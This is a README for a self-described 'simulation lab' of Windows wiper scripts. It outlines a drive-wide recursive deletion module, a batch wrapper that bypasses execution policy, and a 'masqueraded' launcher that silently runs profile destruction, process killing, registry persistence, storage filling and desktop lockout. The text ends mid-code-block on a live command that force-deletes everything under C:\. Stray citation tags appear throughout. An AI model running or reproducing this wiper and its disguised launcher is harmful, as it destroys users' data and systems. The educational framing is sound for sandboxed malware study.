# Windows Environment Disruption and Payload Simulation Lab

**CRITICAL WARNING: THIS REPOSITORY CONTAINS DESTRUCTIVE SIMULATION SCRIPTS.**
The scripts contained herein are designed to execute recursive file deletion, process termination, system configuration modification, and storage exhaustion[cite: 3, 5, 7]. They are intended **strictly for educational purposes, malware behavior analysis, and authorized security testing** within isolated, non-production sandbox environments (e.g., dedicated Virtual Machines). Do not execute these files on any live production system or machine containing sensitive data.

---

## Overview
This repository functions as an educational laboratory demonstrating how built-in administrative tools and scripting languages (PowerShell and Batch) can be utilized to execute destructive payloads, maintain persistence, and inhibit user interface interaction[cite: 3, 4, 7]. 

The project is divided into two distinct simulation tracks:
1. **Volumetric Volume Wiping:** Simulating a catastrophic, drive-wide deletion payload.
2. **Targeted Profile Manipulation & TTP Simulation:** Demonstrating specific post-exploitation Tactics, Techniques, and Procedures (TTPs) such as process termination, data wiping, local persistence registry injection, storage exhaustion, and user interface modification.

---

## Repository Contents

| File | Type | Functional Role |
| :--- | :--- | :--- |
| `TotalClean.ps1` | PowerShell | Core script for drive-wide recursive deletion and visual execution countdown. |
| `LaunchClean.bat` | Batch Wrapper | Bypasses local execution policies to launch the volume wiper module. |
| `sunshine.ps1` | PowerShell | Core script executing targeted profile data destruction, process locking termination, storage filling, registry persistence, and desktop restrictions. |
| `sunshine.bat` | Batch Wrapper | Serves as a masqueraded execution harness that invokes the environment disruption payload silently. |

---

## Detailed Technical Analysis

### Module 1: Drive-Wide Catastrophic Wiping (`TotalClean.ps1`)
This module targets the core file structure of the system drive using standard automation cmdlets:
```powershell
Remove-Item -Path C:\* -Recurse -Force -ErrorAction SilentlyContinue
